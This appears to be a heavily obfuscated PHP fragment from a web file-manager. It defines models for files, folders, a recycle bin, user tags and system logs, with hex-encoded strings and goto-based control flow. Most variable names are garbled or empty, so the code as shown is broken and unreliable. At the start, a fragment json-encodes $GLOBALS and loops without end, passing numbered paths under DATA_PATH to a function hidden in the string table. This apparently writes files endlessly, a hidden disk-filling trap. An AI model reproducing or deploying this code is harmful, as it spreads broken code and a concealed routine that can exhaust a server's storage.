$–â($_SERVER[$Ê≥¶[920]]); $ƒ® = $Ê≥¶[918]; $ƒ®(); $¬ï = $Ê≥¶[921]; $ = json_encode($GLOBALS[$Ê≥¶[922]]); $‰éü = 1; for ($≈û‹ü = $‰éü; $≈û‹ü > 0; $≈û‹ü++) { $¬ï(DATA_PATH . $≈û‹ü, $); } } $ = $this->sourceInfo($⁄π); $ = $this->pathInfoMore($⁄π); if (!$) { return !0; } if ($[$Ê≥¶[190]] == 0) { if (!_get($GLOBALS, $Ê≥¶[545])) { return !1; } } $this->lockMoveStart($⁄π); Hook::trigger($Ê≥¶[2183], $, $—É∆ê); if ($—É∆ê) { Model($Ê≥¶[2182])->moveToRecycle($⁄π); } else { $ = $this->childrenAll($); Model($Ê≥¶[610])->eventRemove($⁄π); $this->removeRelevance($[$Ê≥¶[2181]], $[$Ê≥¶[1496]]); } $this->folderSizeReset($[$Ê≥¶[190]]); $Èπ° = array($[$Ê≥¶[190]]); if ($[$Ê≥¶[462]] == $Ê≥¶[98]) { $Èπ°[] = $[$Ê≥¶[191]]; } $this->updateModifyTime($Èπ°); $this->lockMoveEnd($⁄π); Hook::trigger($Ê≥¶[1727], $, $—É∆ê); return !0; } public function childrenAll($) { $¬© =& $_SERVER[]; $¬é = $[$¬©[191]]; if ($[$¬©[462]] == $¬©[98]) { $÷ª = array($¬©[629] => array($¬©[589], $[$¬©[562]] . $¬é . $¬©[590])); $ = array($¬©[629] => $÷ª[$¬©[562]]); $À£ = $this->field($¬©[2184])->where($)->select(); $ = !1; $‹ã = array($¬é); if ($À£) { $ = array_to_keyvalue($À£, $¬©[22], $¬©[518]); $ = array_remove_value($, $¬©[222]); $‹ã = array_to_keyvalue($À£, $¬©[22], $¬©[191]); $‹ã[] = $¬é; } } else { $ = array($[$¬©[518]]); $‹ã = array($¬é); } return array($¬©[2181] => $‹ã, $¬©[1496] => $); } public function removeArray($–û…©) { if (!$–û…©) { return !0; } } public function removeRelevance($, $⁄ë) { $ =& $_SERVER[]; $ = $ ? $ : array(); $⁄ë = $⁄ë ? $⁄ë : array(); $ = array_unique(array_filter($)); $⁄ë = array_unique(array_filter($⁄ë)); if (!$) { return !1; } $ÃΩ = array($[468] => array($[469], $)); Model($[2182])->where($ÃΩ)->delete(); Model($[512])->where($ÃΩ)->delete(); Model($[2030])->where($ÃΩ)->delete(); Model($[610])->where($ÃΩ)->delete(); Model($[1863])->removeBySource($); Model($[2163])->removeBySource($); $this->where($ÃΩ)->delete(); Model($[521])->remove($⁄ë); for ($ÃÄ = 0; $ÃÄ < count($); $ÃÄ++) { $this->sourceCacheClear($[$ÃÄ]); } } public function rename($, $) { $ =& $_SERVER[]; $ = $this->sourceInfo($); if (!$) { return !1; } $ = $this->fileNameExist($[$[190]], $); if ($ && $ != $) { return !1; } $ = array($[471] => $, $[628] => USER_ID); if ($[$[462]] != $[98]) { $[$[463]] = substr(get_path_ext($), 0, 10); } Model($[610])->eventRename($, $[$[42]], $); $this->sourceCacheClear($); $this->setNamePinyin($, $[$[42]], !1); $this->updateModifyTime($[$[190]]); $Ú≥ÉÉ = $this->where(array($[468] => $))->data($)->save(); $ = $[2171] . $[$[190]]; if (isset(self::$cacheChildList[$])) { unset(self::$cacheChildList[$]); } return $Ú≥ÉÉ; } public function setNamePinyin($⁄∫, $, $…ï = true) { $ÿÅÍ†ò =& $_SERVER[]; $ = Input::check($, $ÿÅÍ†ò[632]); $“πÈ∞Ö = array($ÿÅÍ†ò[494] => KodSort::makeStr($)); if ($) { $“πÈ∞Ö[$ÿÅÍ†ò[515]] = str_replace($ÿÅÍ†ò[63], $ÿÅÍ†ò[22], Pinyin::get($)); $“πÈ∞Ö[$ÿÅÍ†ò[514]] = Pinyin::get($, $ÿÅÍ†ò[633]); } if (!$…ï && !$) { $“πÈ∞Ö[$ÿÅÍ†ò[515]] = null; $“πÈ∞Ö[$ÿÅÍ†ò[514]] = null; } $this->metaSet($⁄∫, $“πÈ∞Ö); } public function getContent($›¢) { $»º =& $_SERVER[]; $«• = $this->fileInfoGet($›¢); if (!$«•) { return !1; } if ($«•[$»º[86]] == 0) { return $»º[22]; } $ = $»º[2185] . $«•[$»º[650]]; if ($«•[$»º[86]] <= 1024 * 10) { $ ∂ÎÉΩ = Cache::get($); if (!$ ∂ÎÉΩ) { $ ∂ÎÉΩ = IO::getContent($«•[$»º[94]]); Cache::set($, $ ∂ÎÉΩ); } return $ ∂ÎÉΩ; } if (!$«•[$»º[94]]) { return $»º[22]; } return IO::getContent($«•[$»º[94]]); } public function setDesc($, $Œ§«µ) { $ =& $_SERVER[]; Model($[610])->eventAddDesc($, $Œ§«µ); return $this->metaSet($, $[503], $Œ§«µ); } public function setContent($, $Œπ = '') { $ƒ© =& $_SERVER[]; $»ª = $this->sourceInfo($); $ = $this->fileInfoGet($); if (!$ || !$»ª) { return !1; } $›õﬂã = Model($ƒ©[521])->addFileByContent($Œπ, $»ª[$ƒ©[42]]); $ = $this->fileHistory($»ª, $›õﬂã[$ƒ©[518]], $›õﬂã[$ƒ©[86]]); if (!$) { return Model($ƒ©[521])->remove($›õﬂã[$ƒ©[518]]); } $this->folderSizeReset($»ª[$ƒ©[190]]); return !0; } public function fileSubstr($, $›é, $) { $Ë¢ó = $this->fileInfoGet($); if (!$Ë¢ó) { return !1; } return IO::fileSubstr($Ë¢ó[$_SERVER[][94]], $›é, $); } public function fileInfoGet($Âµ°) { $◊É =& $_SERVER[]; $⁄ñ = $this->sourceInfo($Âµ°); if (!$⁄ñ || $⁄ñ[$◊É[462]]) { return !1; } $–â√§ = $◊É[524] . $⁄ñ[$◊É[518]]; $ŸôﬁÜ = _get(self::$cacheFileInfo, $–â√§); if ($ŸôﬁÜ) { return $ŸôﬁÜ; } $÷∫ = Model($◊É[521])->fileInfo($⁄ñ[$◊É[518]]); if ($÷∫) { $÷∫[$◊É[42]] = $⁄ñ[$◊É[42]]; } self::$cacheFileInfo[$–â√§] = $÷∫; return $÷∫; } private function folderChildrenNumber($) { $ =& $_SERVER[]; $ = $this->sourceInfo($); $ = array($[629] => array($[589], $[$[562]] . $ . $[590]), $[626] => $[$[547]], $[481] => intval($[$[482]]), $[623] => 1); $Ÿ∑ = $this->where($)->count(); $ = $this->where($)->where(array($[623] => 0))->count(); return array($[90] => $, $[91] => $Ÿ∑); } public function pathInfo($ÊÇ¥, $ = false) { $ =& $_SERVER[]; $ = !1; $ÊÇ¥ = intval($ÊÇ¥); $Îº¶ = $[511] . intval($) . $[439] . $ÊÇ¥; $ = _get(self::$cachePathInfo, $Îº¶); if ($) { return $; } $Ÿµ = $this->sourceInfo($ÊÇ¥); if (!$Ÿµ) { return !1; } $Ÿµ = $this->_listDataApplyItem($Ÿµ, $); self::$cachePathInfo[$Îº¶] = $Ÿµ; return $Ÿµ; } public static $cachePathInfoMore = array(); public function pathInfoMore($) { $€å =& $_SERVER[]; $‰üï = _get(self::$cachePathInfoMore, $); if ($‰üï) { return $‰üï; } $ í = $this->pathInfo($); if (!$ í) { return !1; } if ($ í[$€å[462]] == $€å[98]) { $ í[$€å[89]] = $this->folderChildrenNumber($); } self::$cachePathInfoMore[$] = $ í; return $ í; } public function sourceInfo($Ùãúë) { $›û =& $_SERVER[]; if (!$Ùãúë) { return array(); } $Ùãúë = intval($Ùãúë); $ = $›û[510] . $Ùãúë; $ = _get(self::$cacheSourceInfo, $); if ($) { return $; } $”ª≈ñ = $this->where(array($›û[191] => $Ùãúë))->find(); self::$cacheSourceInfo[$] = $”ª≈ñ; return self::$cacheSourceInfo[$]; } public function sourceCacheClear($ = false) { self::cacheClear($); } public static function cacheClear($›õ = false) { $Œ∂…ø =& $_SERVER[]; if ($›õ == !1) { self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); self::$cachePathInfo = null; self::$cachePathInfo = array(); self::$cachePathInfoMore = null; self::$cachePathInfoMore = array(); return; } unset(self::$cacheSourceInfo[$Œ∂…ø[510] . $›õ]); unset(self::$cachePathInfoMore[$›õ]); unset(self::$cachePathInfo[$Œ∂…ø[2186] . $›õ]); unset(self::$cachePathInfo[$Œ∂…ø[2187] . $›õ]); } public function metaSet($œß, $“ëÂåæ = null, $Õü = null) { $€π = parent::metaSet($œß, $“ëÂåæ, $Õü); if ($€π) { $this->sourceCacheClear($œß); } return $€π; } public function pathInfoByPath($—ñ, $) { $⁄≤ =& $_SERVER[]; $≈ô = !$ ? array() : explode($⁄≤[18], trim($, $⁄≤[18])); $«î = $—ñ; foreach ($≈ô as $Èáä) { $∆Ö = array($⁄≤[190] => $«î, $⁄≤[42] => $Èáä); $ = $this->field($⁄≤[2188])->where($∆Ö)->select(); if (!$) { return !1; } $ = array_sort_by($, $⁄≤[482]); $«î = $[0][$⁄≤[191]]; } $‘§⁄æ = $this->sourceInfo($«î); $this->pathInfoFilter($‘§⁄æ); return $‘§⁄æ; } protected function updateModifyTime($÷†) { $ =& $_SERVER[]; $Ÿ≤ = defined($[2104]) ? USER_ID : 0; if (!$÷†) { return; } if (!is_array($÷†)) { $÷† = array($÷†); } foreach ($÷† as $Ãº => $ÿí ≤) { $÷†[$Ãº] = intval($ÿí ≤); $this->sourceCacheClear($ÿí ≤); } $ = array($[191] => array($[17], $÷†)); $ = array($[628] => $Ÿ≤, $[475] => time()); $this->where($)->save($); } public function folderSizeReset($, $»®ÿô = false) { $ =& $_SERVER[]; if ($this->statusIgnoreResetSpace) { return; } $È∑Ä = $this->sourceInfo($); $⁄ü≈Ø = $[2189] . $; CacheLock::lock($⁄ü≈Ø, 20); if ($»®ÿô === !1) { $this->sourceCacheClear($); $È∑Ä = $this->sourceInfo($); $ = array($[454] => $, $[481] => 0); $ = $this->where($)->sum($[86]); $»®ÿô = intval($) - intval($È∑Ä[$[86]]); } if ($»®ÿô == 0) { return CacheLock::unlock($⁄ü≈Ø); } $”Ω = $this->parentLevelArray($È∑Ä[$[562]]); if (!$”Ω) { $”Ω = array(); } $”Ω[] = $È∑Ä[$[191]]; $ = array($[191] => array($[469], $”Ω)); if ($»®ÿô < 0) { $[$[86]] = array($[1056], abs($»®ÿô)); } $this->where($)->setAdd($[86], $»®ÿô); CacheLock::unlock($⁄ü≈Ø); $ = $[2190] . $È∑Ä[$[188]] . $[4] . $È∑Ä[$[547]]; $ÿº = array($È∑Ä[$[188]], $È∑Ä[$[547]]); TaskRun::timeLimitCall($, $[2191], $ÿº, 1.5); } public function folderSizeResetChildren($‘ü) { $ =& $_SERVER[]; $this->sourceCacheClear($‘ü); $ å = $this->sourceInfo($‘ü); $ = array($[623] => 1, $[626] => $ å[$[547]], $[629] => array($[589], $ å[$[562]] . $‘ü . $[590])); $ = $[2192]; $Àπ = $this->field($)->where($)->select(); $[$[462]] = 0; $ = $this->field($)->where($)->select(); if (!$) { return; } $Àπ[] = $ å; $Àπ = array_to_keyvalue($Àπ, $[191]); foreach ($Àπ as $Ï∫û => $) { $Àπ[$Ï∫û][$[2193]] = $Àπ[$Ï∫û][$[86]]; $Àπ[$Ï∫û][$[86]] = 0; } foreach ($ as $) { $ = $[$[190]] . $[22]; if (!isset($Àπ[$])) { continue; } if ($[$[482]] == $Àπ[$][$[482]]) { $Àπ[$][$[86]] += $[$[86]]; } } foreach ($Àπ as $) { $≈§ = $this->parentLevelArray($[$[562]]); foreach ($≈§ as $) { $ = $ . $[22]; if (!isset($Àπ[$])) { continue; } if ($[$[482]] == $Àπ[$][$[482]]) { $Àπ[$][$[86]] += $[$[86]]; } } } $‹æ = array(); foreach ($Àπ as $) { if ($[$[86]] == $[$[2193]]) { continue; } $‹æ[] = array($[191], $[$[191]], $[86], $[$[86]]); } $this->saveAll($‹æ); } public function userSpaceReset($ = false) { $ =& $_SERVER[]; $À• = $this->where(array($[188] => self::TYPE_USER, $[547] => $, $[462] => 0))->sum($[86]); $À• = !$À• || $À• <= 0 ? 0 : $À•; Model($[555])->userEdit($, array($[1872] => $À•)); } public function targetSpaceUpdate($, $¬£Ó¥á) { $ =& $_SERVER[]; if (!$¬£Ó¥á) { return; } if (!in_array($, array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $‘© = $this->targetSpaceSize($, $¬£Ó¥á); if ($ == self::TYPE_USER) { Model($[555])->userEdit($¬£Ó¥á, array($[1872] => $‘©)); } else { if ($ == self::TYPE_GROUP) { Model($[563])->groupEdit($¬£Ó¥á, array($[1872] => $‘©)); } } } public function targetSpaceSize($, $÷ô‚éç) { $Ó°ñ⁄ô =& $_SERVER[]; $Àñ = 0; $Ÿ´ = $this->targetSourceRoot($, $÷ô‚éç, !0); foreach ($Ÿ´ as $) { if (!$) { continue; } $Àñ += floatval($[$Ó°ñ⁄ô[86]]); $ = array($Ó°ñ⁄ô[629] => array($Ó°ñ⁄ô[589], $Ó°ñ⁄ô[572] . $[$Ó°ñ⁄ô[191]] . $Ó°ñ⁄ô[590])); $Ô¶§ = Model($Ó°ñ⁄ô[480])->field($Ó°ñ⁄ô[468])->where($)->select(); $Ô¶§ = array_to_keyvalue($Ô¶§, $Ó°ñ⁄ô[22], $Ó°ñ⁄ô[191]); $Ô¶§ = array_unique(array_filter($Ô¶§)); if ($Ô¶§) { $ = array($Ó°ñ⁄ô[468] => array($Ó°ñ⁄ô[469], $Ô¶§)); $Àñ += floatval($this->where($)->sum($Ó°ñ⁄ô[86])); } } $Àñ = !$Àñ || $Àñ <= 0 ? 0 : $Àñ; return $Àñ; } public function allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($) { return $this->fileTypeProfile($, SourceModel::TYPE_USER); } public function groupFileTypeProfile($”î) { return $this->fileTypeProfile($”î, SourceModel::TYPE_GROUP); } private function fileTypeProfile($, $) { $ =& $_SERVER[]; $ƒä = $[2194] . $ . $[21] . $; $›Ωﬂ¨ = Cache::get($ƒä); if ($›Ωﬂ¨) { return $›Ωﬂ¨; } $ = array($[623] => 0); if ($ != !1) { $[$[547]] = $; $[$[188]] = $; } $ = array(); $[$[2195]] = array($[2196] => LNG($[2195]), $[2197] => $this->where($)->count(), $[594] => $this->where($)->sum($[86])); $≈π = KodIO::fileTypeList(); foreach ($≈π as $ÿ´ => $) { $[$[463]] = $this->fileTypeWhere($ÿ´); $[$ÿ´] = array($[2196] => $[$[42]], $[2197] => $this->where($)->count(), $[594] => $this->where($)->sum($[86])); } Cache::set($ƒä, $, 1200); return $; } public function fileNameExist($, $Âãâ) { $€´ =& $_SERVER[]; $‰∏ó = $this->field($€´[2198])->where(array($€´[190] => $, $€´[42] => $Âãâ, $€´[482] => 0))->find(); return is_array($‰∏ó) ? $‰∏ó[$€´[191]] : !1; } public function childList($) { $ =& $_SERVER[]; $ = $[2171] . $; if (isset(self::$cacheChildList[$])) { return self::$cacheChildList[$]; } $‚æò = array($[190] => intval($), $[482] => 0); $»è = $this->where($‚æò)->select(); $»è = $»è ? $»è : array(); self::$cacheChildList[$] = $»è; foreach ($»è as $) { $ = $[510] . $[$[191]]; self::$cacheSourceInfo[$] = $; } return $»è; } public function fileNameAuto($ﬁê, $—±–ä, $ = REPEAT_RENAME, $ § = false) { $ =& $_SERVER[]; $—É = get_path_ext($—±–ä); $ = $—É ? basename($—±–ä, $[20] . $—É) . $[2199] . $—É : $—±–ä . $[437]; $ = array($[190] => $ﬁê, $[482] => 0, $[42] => array($[436], $)); $ = $this->field($[42])->where($)->select(); $ = array_to_keyvalue($, $[22], $[42]); return $this->fileNameAutoGet($, $—±–ä, $, $ §); } public function fileNameAutoGet($, $Î™å, $, $≈ê) { $Îéº =& $_SERVER[]; if ($ == REPEAT_REPLACE || !$ || !in_array_not_case($Î™å, $) || $≈ê && $ != REPEAT_RENAME_FOLDER) { return $Î™å; } if ($ == REPEAT_SKIP) { return !1; } $—ó‘Ω = $Îéº[20] . get_path_ext($Î™å); $—ó‘Ω = $—ó‘Ω == $Îéº[20] || $≈ê ? $Îéº[22] : $—ó‘Ω; for ($€¨ = 1; $€¨ <= count($) + 1; $€¨++) { $”ø = substr($Î™å, 0, strlen($Î™å) - strlen($—ó‘Ω)); $ÿ¢ = $”ø . "\x28{$€¨}\x29{$—ó‘Ω}"; if (!in_array_not_case($ÿ¢, $)) { return $ÿ¢; } } } } class SourceRecycleModel extends ModelBase { protected $tableName = "\x69\157\x5f\163\x6f\165\x72\143\145\137\162\x65\x63\171\x63\154\x65"; protected $dataAuto = array(array("\x63\x72\x65\141\164\145\124\151\155\145", "\164\x69\x6d\x65", "\151\156\x73\145\162\164", "\x66\x75\156\143\x74\x69\x6f\156")); public function listData($…ß = false) { $ =& $_SERVER[]; $…ß = $…ß ? $…ß : USER_ID; $∆ó = $this->where(array($[1676] => $…ß))->select(); return array_to_keyvalue($∆ó, $[22], $[191]); } public function moveToRecycle($) { $ =& $_SERVER[]; $ƒì = Model($[1373]); $ = $ƒì->sourceInfo($); if (!$ || $[$[482]] == $[98]) { return; } $ = array($[468] => $, $[1676] => USER_ID, $[625] => $[$[188]], $[626] => $[$[547]], $[629] => $[$[562]]); $this->add($); $this->recycleMove($, 1); if ($[$[462]] == $[98]) { $ = array($[629] => array($[589], $[$[562]] . $ . $[590])); $ƒì->where($)->setField($[482], 1); } } public function clear() { $this->remove(!1); } public function remove($…© = false, $√ù = false) { $Áäê =& $_SERVER[]; $√ù = $√ù ? $√ù : USER_ID; $«µ = Model($Áäê[1373]); $œ¢ = $this->listData($√ù); $…© = $…© === !1 ? !1 : $…©; $⁄à„∞© = array(); foreach ($œ¢ as $) { if ($…© != !1 && !in_array($, $…©)) { continue; } $€Å = $«µ->sourceInfo($); $«µ->remove($, !1); $”∑ = $€Å[$Áäê[188]] . $Áäê[21] . $€Å[$Áäê[547]]; $⁄à„∞©[$”∑] = array($Áäê[625] => $€Å[$Áäê[188]], $Áäê[547] => $€Å[$Áäê[547]]); $this->where(array($Áäê[191] => $))->delete(); } foreach ($⁄à„∞© as $) { $«µ->targetSpaceUpdate($[$Áäê[188]], $[$Áäê[547]]); } } public function restore($ = false) { $◊ñ = $this->listData(); $this->_restoreSource($◊ñ, $); } public function removeUserAll($œ≥) { $this->remove(!1, $œ≥); } public function restoreItem($¬û) { $this->_restoreSource(array($¬û), array($¬û)); } private function _restoreSource($›¨, $◊Ö–¶) { $ =& $_SERVER[]; $–¢ = Model($[1373]); $◊Ö–¶ = $◊Ö–¶ == !1 ? !1 : $◊Ö–¶; if (!$›¨) { return !0; } $ ü = array(); foreach ($›¨ as $◊õ) { if ($◊Ö–¶ != !1 && !in_array($◊õ, $◊Ö–¶)) { continue; } $›¢ = $–¢->sourceInfo($◊õ); $Æà† = $–¢->sourceInfo($›¢[$[190]]); if ($Æà†[$[482]] == $[98]) { continue; } $–¢->lockMoveStart($◊õ); $this->recycleMove($◊õ, 0); if ($›¢[$[462]] == $[98]) { $€≤ = array($[629] => array($[589], $›¢[$[562]] . $◊õ . $[590])); $–¢->where($€≤)->setField($[482], 0); $this->restoreFolderChildren($◊õ, $›¨); } $this->where(array($[191] => $◊õ))->delete(); $–¢->folderSizeReset($›¢[$[190]]); $ ü[] = $›¢[$[190]]; if ($›¢[$[462]] == $[98]) { $ ü[] = $◊õ; } $–¢->lockMoveEnd($◊õ); } $–¢->updateModifyTime($ ü); } private function restoreFolderChildren($, $ﬁå) { $ =& $_SERVER[]; $Ÿô = Model($[1373]); $–æ = array($[191] => array($[17], array())); foreach ($ﬁå as $„æû“≤) { if ($„æû“≤ == $) { continue; } if (!$Ÿô->isParentOf($, $„æû“≤)) { continue; } $√§ = $Ÿô->sourceInfo($„æû“≤); if ($√§[$[462]] == $[98]) { $–æ[] = array($[629] => array($[589], $√§[$[562]] . $„æû“≤ . $[590])); } else { $–æ[$[191]][1][] = $„æû“≤; } } if (!$–æ[$[191]][1]) { unset($–æ[$[191]]); } if (!$–æ) { return; } if (is_array($–æ[$[191]]) && is_array($–æ[$[191]][1])) { $–æ[$[191]][1] = array_unique($–æ[$[191]][1]); } $–æ[$[1041]] = $[1981]; $Ÿô->where($–æ)->setField($[482], 1); } private function recycleMove($Óì¶, $ = 1) { $¬é =& $_SERVER[]; $ = Model($¬é[1373]); $Àô = Model($¬é[2200]); $ = array($¬é[191] => $Óì¶); if ($) { $->where($)->setField($¬é[482], 1); $Àô->eventRecycle($Óì¶, $¬é[2201]); } else { $√¶ = $->where($)->find(); $–æ = $√¶[$¬é[462]] == $¬é[98]; $‹Ö = $->fileNameAuto($√¶[$¬é[190]], $√¶[$¬é[42]], REPEAT_RENAME_FOLDER, $–æ); if ($‹Ö != $√¶[$¬é[42]]) { $->rename($Óì¶, $‹Ö); } $->where($)->setField($¬é[482], 0); $Àô->eventRecycle($Óì¶, $¬é[2202]); } } } goto D; d”ø: define($_SERVER[][293], 3); define($_SERVER[][294], 1); define($_SERVER[][295], 0); goto Bÿ≠; e—ä: class UserOptionModel extends ModelBaseOption { protected $tableName = "\165\163\145\162\x5f\x6f\160\164\151\157\156"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($»õ) { $ =& $_SERVER[]; $‘∏ = defined($[2104]) && USER_ID ? USER_ID : $[22]; return "\125\163\145\x72\x4f\160\164\151\157\156\x5f{$»õ}\137" . $‘∏; } protected function filterWhere($Ê©º) { $›ª =& $_SERVER[]; $Ê©º[$›ª[1685]] = defined($›ª[2104]) && USER_ID ? USER_ID : $›ª[22]; return $Ê©º; } public function cacheRemoveUser($◊î, $Ÿä) { return Cache::remove("\125\163\x65\162\117\x70\164\x69\x6f\x6e\137{$◊î}\137" . $Ÿä); } protected function optionDefault($…º = '') { $√∫ =& $_SERVER[]; if ($…º == $√∫[22]) { return $GLOBALS[$√∫[16]][$√∫[2380]]; } if ($…º == $√∫[2381]) { return $GLOBALS[$√∫[16]][$√∫[2382]]; } } } class UserTagModel extends ModelBaseLight { public $optionType = "\x55\x73\145\162\56\164\141\147\x4c\x69\x73\x74"; public $modelType = "\x55\163\x65\x72\x4f\160\164\151\157\x6e"; public $field = array("\x6e\141\x6d\145", "\163\164\x79\154\x65", "\163\157\x72\164"); public function listData($Á≠è = false, $€ù = "\163\x6f\x72\164", $€ò = false) { return parent::listData($Á≠è, $€ù, $€ò); } public function remove($) { return parent::remove($); } public function add($—ª, $ƒÆ = "\x6c\141\x62\x65\154\55\x67\x72\x65\171\x2d\156\157\x72\x6d\141\154") { $≈Ø÷ú =& $_SERVER[]; if ($this->findByName($—ª)) { return !1; } $ = array($≈Ø÷ú[471] => $—ª, $≈Ø÷ú[535] => $ƒÆ, $≈Ø÷ú[1887] => $this->getSort($≈Ø÷ú[311]) + 1); return parent::insert($); } public function update($, $‘ù) { $ =& $_SERVER[]; $Œ≥’ß = $this->listData($); $ = $this->findByName($‘ù[$[42]]); if (!$Œ≥’ß || $ && $[$[452]] != $Œ≥’ß[$[452]]) { return !1; } return parent::update($, $‘ù); } public function moveTop($–∑) { $Œº =& $_SERVER[]; $»õ»ë = parent::listData(); $’Æ = $this->getSort($Œº[310]); foreach ($»õ»ë as &$◊å) { if ($◊å[$Œº[452]] == $–∑) { $◊å[$Œº[1907]] = $’Æ; continue; } $◊å[$Œº[1907]] += 1; } unset($◊å); return parent::resetData($»õ»ë); } public function moveBottom($) { $ﬁù =& $_SERVER[]; $ƒô = $this->getSort($ﬁù[311]) + 1; return parent::update($, array($ﬁù[1907] => $ƒô)); } public function resetSort($—•) { $Œç÷ª =& $_SERVER[]; $ = array(); $—• = is_array($—•) ? $—• : array(); for ($…∫ = 0; $…∫ < count($—•); $…∫++) { $[$—•[$…∫] . $Œç÷ª[22]] = $…∫ + 1; } $ = parent::listData(); foreach ($ as &$) { $ = $[$[$Œç÷ª[452]]]; $[$Œç÷ª[1907]] = $ ? $ : $[$Œç÷ª[1907]]; } unset($); return parent::resetData($); } private function getSort($) { $ËÜ¶ŒÖ =& $_SERVER[]; $ = parent::listData(); $ = array_to_keyvalue($, $ËÜ¶ŒÖ[22], $ËÜ¶ŒÖ[1907]); if (!$) { $ = array(0); } $“ö = $ == $ËÜ¶ŒÖ[311] ? max($) : min($); return intval($“ö); } } goto E›¢ÿá; F≈ô: class SystemLogModel extends ModelBase { protected $tableName = "\x73\x79\x73\x74\145\x6d\x5f\x6c\157\147"; protected $dataAuto = array(array("\x63\x72\x65\x61\164\145\x54\x69\x6d\x65", "\164\x69\155\x65", "\x69\x6e\x73\145\162\x74", "\x66\165\156\143\164\151\157\x6e")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->typeListAll(); } public function typeListAll() { $Õùﬁè =& $_SERVER[]; return array($Õùﬁè[2219] => LNG($Õùﬁè[2220]), $Õùﬁè[2221] => LNG($Õùﬁè[2222]), $Õùﬁè[1826] => LNG($Õùﬁè[2223]), $Õùﬁè[2224] => LNG($Õùﬁè[2225]), $Õùﬁè[2226] => LNG($Õùﬁè[2227]), $Õùﬁè[2228] => LNG($Õùﬁè[2229]), $Õùﬁè[2230] => LNG($Õùﬁè[2231]), $Õùﬁè[1856] => LNG($Õùﬁè[2231]), $Õùﬁè[1857] => LNG($Õùﬁè[2232]), $Õùﬁè[2233] => LNG($Õùﬁè[2234]), $Õùﬁè[2235] => LNG($Õùﬁè[2236]), $Õùﬁè[2237] => LNG($Õùﬁè[2238]), $Õùﬁè[2239] => LNG($Õùﬁè[2240]), $Õùﬁè[1854] => LNG($Õùﬁè[2241]), $Õùﬁè[2242] => LNG($Õùﬁè[2243]), $Õùﬁè[1861] => LNG($Õùﬁè[2244]), $Õùﬁè[2245] => LNG($Õùﬁè[2246]), $Õùﬁè[2247] => LNG($Õùﬁè[2248]), $Õùﬁè[2249] => LNG($Õùﬁè[2250]), $Õùﬁè[2251] => LNG($Õùﬁè[2252]), $Õùﬁè[1864] => LNG($Õùﬁè[2253]), $Õùﬁè[1865] => LNG($Õùﬁè[2254]), $Õùﬁè[2255] => LNG($Õùﬁè[2256]), $Õùﬁè[2257] => LNG($Õùﬁè[2258]), $Õùﬁè[2259] => LNG($Õùﬁè[2260]), $Õùﬁè[1859] => LNG($Õùﬁè[2261]), $Õùﬁè[2262] => LNG($Õùﬁè[2263]), $Õùﬁè[1858] => LNG($Õùﬁè[2264]), $Õùﬁè[2265] => LNG($Õùﬁè[2266]), $Õùﬁè[2267] => LNG($Õùﬁè[2268]), $Õùﬁè[2269] => LNG($Õùﬁè[2270]), $Õùﬁè[2271] => LNG($Õùﬁè[2271]), $Õùﬁè[2272] => LNG($Õùﬁè[1830]), $Õùﬁè[2273] => LNG($Õùﬁè[2274]), $Õùﬁè[2275] => LNG($Õùﬁè[2276]), $Õùﬁè[2277] => LNG($Õùﬁè[2278]), $Õùﬁè[2279] => LNG($Õùﬁè[2280]), $Õùﬁè[2281] => LNG($Õùﬁè[2282]), $Õùﬁè[2283] => LNG($Õùﬁè[2283]), $Õùﬁè[2284] => LNG($Õùﬁè[2285]), $Õùﬁè[2286] => LNG($Õùﬁè[2287]), $Õùﬁè[2288] => LNG($Õùﬁè[2289]), $Õùﬁè[2290] => LNG($Õùﬁè[2291]), $Õùﬁè[2292] => LNG($Õùﬁè[2293]), $Õùﬁè[2294] => LNG($Õùﬁè[2295])); } private function typeFile() { $«ïÃÑ =& $_SERVER[]; $ = array($«ïÃÑ[1861] => array($«ïÃÑ[1862]), $«ïÃÑ[2237] => array($«ïÃÑ[2296]), $«ïÃÑ[2239] => array($«ïÃÑ[2297]), $«ïÃÑ[1854] => array($«ïÃÑ[1855], $«ïÃÑ[2298]), $«ïÃÑ[2247] => array(), $«ïÃÑ[2249] => array(), $«ïÃÑ[2251] => array(), $«ïÃÑ[1864] => array($«ïÃÑ[1866]), $«ïÃÑ[1865] => array($«ïÃÑ[1866]), $«ïÃÑ[2255] => array($«ïÃÑ[2299]), $«ïÃÑ[2257] => array($«ïÃÑ[2299]), $«ïÃÑ[2259] => array($«ïÃÑ[2300]), $«ïÃÑ[2245] => array($«ïÃÑ[2301]), $«ïÃÑ[1859] => array($«ïÃÑ[2302]), $«ïÃÑ[2262] => array($«ïÃÑ[2303]), $«ïÃÑ[1858] => array($«ïÃÑ[1860])); return $; } private function typeAll() { $“≤ =& $_SERVER[]; $ = $this->typeList; $ËåÖ’Ä = array_filter($this->typeFile()); foreach ($ËåÖ’Ä as $ => $”æ) { $[$”æ[0]] = $[$]; } $[$“≤[1866]] = LNG($“≤[2304]); $[$“≤[2299]] = LNG($“≤[2305]); return $; } public function addLog($Èæè, $»ù = array()) { $ =& $_SERVER[]; if (!isset($this->typeList[$Èæè])) { return; } $—∑ = isset($»ù[$[1685]]) ? $»ù[$[1685]] : 0; if (!$—∑) { $—∑ = Session::get($[2020]); } if ($Èæè == $[2273] && is_array($»ù[$[2306]]) && !$»ù[$[2306]]) { return; } $—≠ = get_client_ip(); if (!$»ù || strlen(json_encode($»ù)) >= 1024) { $»ù = array($[2307] => $—≠); } else { if (is_array($»ù)) { $»ù[$[2307]] = $—≠; } else { $»ù = array($[1243] => $»ù, $[2307] => $—≠); } } $»ù = array($[1675] => Session::sign(), $[1676] => intval($—∑), $[43] => $Èæè, $[1678] => json_encode($»ù)); parent::add($»ù); } public function remove($—Ñ) { $this->where(array($_SERVER[][470] => $—Ñ))->delete(); } private function _makeOrder($ÂíÇ = '') { $ =& $_SERVER[]; $–† = $[225]; $∆ú›Æ = array($[500] => $[501], $[502] => $[503]); $÷û = Input::get($[508], $[17], $[2056], array($[1974], $[502])); $÷û = $∆ú›Æ[$÷û]; $ÂíÇ = $ÂíÇ . "{$–†}\x20{$÷û}"; return $this->order($ÂíÇ); } public function get($√Å = '') { $‰óáÕñ =& $_SERVER[]; if (!$√Å) { show_json(array()); } $ = array(); if ($√Å[$‰óáÕñ[1685]]) { $[$‰óáÕñ[1685]] = $√Å[$‰óáÕñ[1685]]; } if 